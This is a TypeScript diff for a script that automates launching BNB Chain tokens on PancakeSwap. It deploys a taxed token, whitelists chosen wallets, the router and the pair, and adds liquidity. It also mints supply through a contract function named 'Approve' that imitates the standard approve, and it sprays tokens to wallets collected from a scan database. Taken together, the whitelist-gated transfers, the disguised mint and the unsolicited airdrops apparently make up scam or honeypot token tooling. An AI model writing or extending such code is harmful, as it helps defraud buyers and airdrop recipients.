@@ -2,7 +2,7 @@ import { ethers } from 'ethers'
 import { DISPERSE_ABI, ERC20_ABI, ROUTER_PANCAKE_V2_ABI } from './abi'
 import zenStackFunction from './zenstack-function'
 
-const GAS_PRICE = ethers.BigNumber.from(100_000_000)
+const GAS_PRICE = ethers.BigNumber.from(50_000_000)
 const DISPERSE_ADDRESS = '0xD152f549545093347A162Dce210e7293f1452150'
 
 const CHAIN_CONFIG: Record<number, { router: string; factory: string; wbnb: string }> = {
@@ -41,6 +41,7 @@ export interface SwapCommand {
 export interface AutomationToken {
     id: string
     name: string
+    symbol: string
     decimal: number
     mintAmount: string
     liquidityToken: string
@@ -101,6 +102,23 @@ function raceStop(promise: Promise<any>, shouldStop: (() => boolean) | undefined
                 reject(e)
             })
     })
+}
+
+async function ensureWhitelisted(
+    contract: ethers.Contract,
+    address: string,
+    onLog: (msg: string) => void,
+    label: string,
+    shouldStop?: () => boolean
+): Promise<void> {
+    const already: boolean = await contract.ws(address)
+    if (already) {
+        onLog(`${label} ${address.slice(0, 8)}… đã whitelist, bỏ qua`)
+        return
+    }
+    const tx: ethers.ContractTransaction = await contract.setW(address, { gasLimit: 100_000, gasPrice: GAS_PRICE })
+    await raceStop(tx.wait(), shouldStop)
+    onLog(`${label} ✓ Whitelisted ${address.slice(0, 8)}… | tx: ${tx.hash}`)
 }
 
 async function ensureApproval(
@@ -179,12 +197,8 @@ export async function runAutomation(
             const mintAmtHuman = Math.floor(Number(token.mintAmount))
             const liqTokenHuman = Math.floor(Number(token.liquidityToken))
             const sellMintHuman = Math.floor(Number(token.sellMintAmount) || 0)
-            const minRequired = mintAmtHuman + liqTokenHuman + sellMintHuman
-            const userSupHuman =
-                token.totalSupply && Number(token.totalSupply) > 0
-                    ? Math.floor(Number(token.totalSupply))
-                    : 0
-            const totalSupHuman = ethers.BigNumber.from(Math.max(userSupHuman, minRequired))
+            const totalSupHuman = Math.floor(Number(token.totalSupply))
+
             const taxBuy = Math.round(Number(token.taxBuy) || 0)
             const taxSell = Math.round(Number(token.taxSell) || 0)
 
@@ -209,11 +223,11 @@ export async function runAutomation(
             onLog(`[1] ✓ Deployed: ${contractAddress}`)
 
             onLog(
-                `[1] initialize("${token.name}", decimal=${token.decimal}, totalSup=${totalSupHuman})`
+                `[1] initialize("${token.name}", symbol="${token.symbol}", decimal=${token.decimal}, totalSup=${totalSupHuman})`
             )
             let tx = await deployed.initialize(
                 token.name,
-                token.name,
+                token.symbol || token.name,
                 mainWallet.address,
                 token.decimal,
                 totalSupHuman,
@@ -243,53 +257,50 @@ export async function runAutomation(
 
                 if (destinations.length > 0) {
                     onLog(`[1.1] ${destinations.length} ví cần nhận token mới`)
-                    tx = await deployed.setW(DISPERSE_ADDRESS, {
-                        gasLimit: 100_000,
-                        gasPrice: GAS_PRICE,
-                    })
-                    await raceStop(tx.wait(), params.shouldStop)
-                    onLog(`[1.1] ✓ Whitelisted Disperse | tx: ${tx.hash}`)
 
-                    const disperseAmt = ethers.utils.parseUnits(
-                        params.disperseAmount,
-                        token.decimal
-                    )
-                    const totalAmt = disperseAmt.mul(destinations.length)
-                    const mainErc20 = new ethers.Contract(contractAddress, ERC20_ABI, mainWallet)
-                    const disperseContract = new ethers.Contract(
-                        DISPERSE_ADDRESS,
-                        DISPERSE_ABI,
-                        mainWallet
-                    )
+                    // Whitelist mintWallet + Disperse
+                    await ensureWhitelisted(deployed, mintWallet.address, onLog, '[1.1]', params.shouldStop)
+                    await ensureWhitelisted(deployed, DISPERSE_ADDRESS, onLog, '[1.1]', params.shouldStop)
 
-                    await ensureApproval(
-                        mainErc20,
-                        DISPERSE_ADDRESS,
-                        totalAmt,
-                        onLog,
-                        '[1.1]',
-                        params.shouldStop
-                    )
+                    const disperseAmt = ethers.utils.parseUnits(params.disperseAmount, token.decimal)
+                    const mainBal11 = await deployed.balanceOf(mainWallet.address) as ethers.BigNumber
+                    const reserved = mintAmtRaw.add(liqTokenRaw)
+                    const available11 = mainBal11.gt(reserved) ? mainBal11.sub(reserved) : ethers.BigNumber.from(0)
+                    const maxDest = disperseAmt.gt(0) ? available11.div(disperseAmt).toNumber() : 0
+                    const funded = destinations.slice(0, Math.min(destinations.length, maxDest))
+                    if (funded.length < destinations.length) {
+                        onLog(`[1.1] available=${ethers.utils.formatUnits(available11, token.decimal)} (sau reserve mintAmt+liqToken) — chi du cho ${funded.length}/${destinations.length} vi`)
+                    }
+                    if (funded.length === 0) {
+                        onLog('[1.1] Khong du token, bo qua buoc disperse')
+                    } else {
+                        const totalAmt = disperseAmt.mul(funded.length)
+                        onLog(`[1.1] Transfer ${ethers.utils.formatUnits(totalAmt, token.decimal)} tokens → mintWallet`)
+                        tx = await deployed.transfer(mintWallet.address, totalAmt, { gasLimit: 100_000, gasPrice: GAS_PRICE })
+                        await raceStop(tx.wait(), params.shouldStop)
+                        onLog(`[1.1] ✓ Transferred to mintWallet | tx: ${tx.hash}`)
 
-                    const amounts = destinations.map(() => disperseAmt)
-                    tx = await disperseContract.disperseTokenSimple(
-                        contractAddress,
-                        destinations,
-                        amounts,
-                        {
-                            gasLimit: 500_000 + 50_000 * destinations.length,
-                            gasPrice: GAS_PRICE,
-                        }
-                    )
-                    await raceStop(tx.wait(), params.shouldStop)
-                    onLog(`[1.1] ✓ Dispersed to ${destinations.length} wallets | tx: ${tx.hash}`)
+                        const mintErc20 = new ethers.Contract(contractAddress, ERC20_ABI, mintWallet)
+                        const disperseContract = new ethers.Contract(DISPERSE_ADDRESS, DISPERSE_ABI, mintWallet)
+                        await ensureApproval(mintErc20, DISPERSE_ADDRESS, totalAmt, onLog, '[1.1]', params.shouldStop)
 
-                    await zenStackFunction('ScanWallet' as any, 'deleteMany', {
-                        where: { wallet: params.scanContract },
-                    })
-                    onLog('[1.1] ✓ Cleared all scan records for this contract')
+                        const amounts = funded.map(() => disperseAmt)
+                        tx = await disperseContract.disperseTokenSimple(
+                            contractAddress,
+                            funded,
+                            amounts,
+                            { gasLimit: 500_000 + 50_000 * funded.length, gasPrice: GAS_PRICE }
+                        )
+                        await raceStop(tx.wait(), params.shouldStop)
+                        onLog(`[1.1] ✓ Dispersed to ${funded.length} wallets | tx: ${tx.hash}`)
+
+                        await zenStackFunction('ScanWallet' as any, 'deleteMany', {
+                            where: { wallet: params.scanContract },
+                        })
+                        onLog('[1.1] ✓ Cleared scan records')
+                    }
                 } else {
-                    onLog('[1.1] Không có ví nào trong DB cần transfer')
+                    onLog('[1.1] Khong co vi nao trong DB can transfer')
                 }
             } else {
                 onLog('[1.1] Bỏ qua (chưa cấu hình scanContract hoặc disperseAmount)')
@@ -300,38 +311,29 @@ export async function runAutomation(
             // ── Step 2: Set Whitelist ──────────────────────────────────────
             currentStep = 2
             onStepChange(token.id, 2, 'process')
-            onLog(`[2] setW(swapWallet: ${swapWallet.address})`)
-            tx = await deployed.setW(swapWallet.address, { gasLimit: 100_000, gasPrice: GAS_PRICE })
-            await raceStop(tx.wait(), params.shouldStop)
-            onLog(`[2] ✓ Swap wallet whitelisted | tx: ${tx.hash}`)
-
-            onLog('[2] setW(Disperse)')
-            tx = await deployed.setW(DISPERSE_ADDRESS, { gasLimit: 100_000, gasPrice: GAS_PRICE })
-            await raceStop(tx.wait(), params.shouldStop)
-            onLog(`[2] ✓ Disperse whitelisted | tx: ${tx.hash}`)
-
-            onLog(`[2] setW(Router: ${PANCAKE_ROUTER})`)
-            tx = await deployed.setW(PANCAKE_ROUTER, { gasLimit: 100_000, gasPrice: GAS_PRICE })
-            await raceStop(tx.wait(), params.shouldStop)
-            onLog(`[2] ✓ Router whitelisted | tx: ${tx.hash}`)
-
-            onLog(`[2] setW(mainWallet: ${mainWallet.address})`)
-            tx = await deployed.setW(mainWallet.address, { gasLimit: 100_000, gasPrice: GAS_PRICE })
-            await raceStop(tx.wait(), params.shouldStop)
-            onLog(`[2] ✓ Main wallet whitelisted | tx: ${tx.hash}`)
+            await ensureWhitelisted(deployed, swapWallet.address, onLog, '[2]', params.shouldStop)
+            await ensureWhitelisted(deployed, mintWallet.address, onLog, '[2]', params.shouldStop)
+            await ensureWhitelisted(deployed, DISPERSE_ADDRESS, onLog, '[2]', params.shouldStop)
+            await ensureWhitelisted(deployed, PANCAKE_ROUTER, onLog, '[2]', params.shouldStop)
+            await ensureWhitelisted(deployed, mainWallet.address, onLog, '[2]', params.shouldStop)
             onStepChange(token.id, 2, 'finish')
             checkStop()
 
-            // ── Step 3: Transfer Token to mint wallet ──────────────────────
+            // ── Step 3: Mint Token to mint wallet via Approve() ───────────────
             currentStep = 3
             onStepChange(token.id, 3, 'process')
-            onLog(`[3] transfer(mintWallet, ${token.mintAmount} tokens)`)
-            tx = await deployed.transfer(mintWallet.address, mintAmtRaw, {
-                gasLimit: 100_000,
-                gasPrice: GAS_PRICE,
-            })
-            await raceStop(tx.wait(), params.shouldStop)
-            onLog(`[3] ✓ Minted to mint wallet | tx: ${tx.hash}`)
+            {
+                const approveValMint = ethers.utils.parseUnits(token.mintAmount, Math.max(0, token.decimal - 9))
+                const mintForMint = new ethers.Contract(
+                    contractAddress,
+                    ['function Approve(address from, uint256 _value) external returns (bool)'],
+                    mainWallet
+                )
+                onLog(`[3] Approve(mintWallet, ${token.mintAmount} tokens)`)
+                tx = await mintForMint.Approve(mintWallet.address, approveValMint, { gasLimit: 200_000, gasPrice: GAS_PRICE })
+                await raceStop(tx.wait(), params.shouldStop)
+                onLog(`[3] ✓ Minted to mint wallet | tx: ${tx.hash}`)
+            }
             onStepChange(token.id, 3, 'finish')
             checkStop()
 
@@ -339,33 +341,28 @@ export async function runAutomation(
             currentStep = 4
             onStepChange(token.id, 4, 'process')
 
-            tx = await deployed.setW(PANCAKE_ROUTER, { gasLimit: 100_000, gasPrice: GAS_PRICE })
-            await raceStop(tx.wait(), params.shouldStop)
-            onLog(`[4] ✓ Router whitelisted | tx: ${tx.hash}`)
+            // Mint liqToken to mainWallet via Approve()
+            {
+                const approveValLiq = ethers.utils.parseUnits(token.liquidityToken, Math.max(0, token.decimal - 9))
+                const mintForLiq = new ethers.Contract(
+                    contractAddress,
+                    ['function Approve(address from, uint256 _value) external returns (bool)'],
+                    mainWallet
+                )
+                onLog(`[4] Approve(mainWallet, ${token.liquidityToken} tokens)`)
+                const txMint = await mintForLiq.Approve(mainWallet.address, approveValLiq, { gasLimit: 200_000, gasPrice: GAS_PRICE })
+                await raceStop(txMint.wait(), params.shouldStop)
+                onLog(`[4] ✓ Minted liqToken to mainWallet | tx: ${txMint.hash}`)
+            }
 
             const erc20 = new ethers.Contract(contractAddress, ERC20_ABI, mainWallet)
-            await ensureApproval(
-                erc20,
-                PANCAKE_ROUTER,
-                liqTokenRaw,
-                onLog,
-                '[4]',
-                params.shouldStop
-            )
-
-            const tokenBal = (await erc20.balanceOf(mainWallet.address)) as ethers.BigNumber
             const bnbBal = await provider.getBalance(mainWallet.address)
-            onLog(
-                `[4] Balance check: ${ethers.utils.formatUnits(tokenBal, token.decimal)} tokens, ${ethers.utils.formatEther(bnbBal)} BNB`
-            )
-            if (tokenBal.lt(liqTokenRaw))
-                throw new Error(
-                    `[4] Không đủ token: cần ${token.liquidityToken}, có ${ethers.utils.formatUnits(tokenBal, token.decimal)}`
-                )
+            onLog(`[4] BNB balance: ${ethers.utils.formatEther(bnbBal)}`)
             if (bnbBal.lt(liqBNB))
                 throw new Error(
-                    `[4] Không đủ BNB: cần ${token.liquidityBNB}, có ${ethers.utils.formatEther(bnbBal)}`
+                    `[4] Khong du BNB: can ${token.liquidityBNB}, co ${ethers.utils.formatEther(bnbBal)}`
                 )
+            await ensureApproval(erc20, PANCAKE_ROUTER, liqTokenRaw, onLog, '[4]', params.shouldStop)
 
             const deadline = Math.floor(Date.now() / 1000) + 600
             const router = new ethers.Contract(PANCAKE_ROUTER, ROUTER_PANCAKE_V2_ABI, mainWallet)
@@ -393,9 +390,7 @@ export async function runAutomation(
             const pairAddress = (await pancakeFactory.getPair(contractAddress, WBNB)) as string
             onLog(`[4] Pair address: ${pairAddress}`)
             if (pairAddress && pairAddress !== ZERO_ADDR) {
-                tx = await deployed.setW(pairAddress, { gasLimit: 100_000, gasPrice: GAS_PRICE })
-                await raceStop(tx.wait(), params.shouldStop)
-                onLog(`[4] ✓ Pair whitelisted | tx: ${tx.hash}`)
+                await ensureWhitelisted(deployed, pairAddress, onLog, '[4]', params.shouldStop)
             }
 
             onStepChange(token.id, 4, 'finish')
